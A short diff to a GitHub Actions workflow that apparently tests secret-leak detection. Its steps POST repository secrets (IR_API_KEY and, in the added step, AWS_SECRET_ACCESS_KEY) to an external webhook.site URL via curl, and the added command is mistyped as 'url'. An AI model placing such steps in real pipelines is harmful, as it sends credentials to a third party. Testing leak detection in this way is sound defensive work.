@@ -40,6 +40,13 @@ jobs:
           curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
             -H "Content-Type: application/json" \
             -d "{\"leaked_secret_IR_API_KEY\": \"${{ secrets.IR_API_KEY }}\"}"
+            
+      - name: Simulate secret leak of AWS Secret Key via cURL
+        run: |
+          url -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
+          -H "Content-Type: application/json" \
+          -d "{\"aws_secret_access_key\": \"${{ secrets.AWS_SECRET_ACCESS_KEY }}\"}"
+            
 
       - name: Cleanup PSE
         if: always()
